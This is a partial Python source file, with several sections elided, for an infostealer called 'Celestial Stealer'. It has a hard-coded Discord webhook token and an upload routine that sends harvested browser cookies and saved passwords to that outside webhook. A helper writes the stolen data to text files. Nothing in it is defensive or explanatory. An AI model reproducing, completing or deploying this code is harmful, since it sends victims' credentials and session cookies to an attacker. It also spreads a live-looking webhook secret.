...
hook = "https://discord.com/api/webhooks/1049133555214729267/MQjdiGsWBD4fQnXvdR3whqqAlbHJr4qYNJrK_wCj9qPBNnsavYrjG2NvRkY9lNutGVYK"
...
def upload(name, link):
    ...
    if name == "wpcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "> **Celestial | Cookies Stealer**",
                    "description": f"<:apollondelirmis:1012370180845883493> | **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CelestialCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "> Celestial Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
    ...
    if name == "wppassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "> **Celestial | Password Stealer**",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CelestialPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "**Celestial Stealer**",
                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Celestial Stealer Best -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
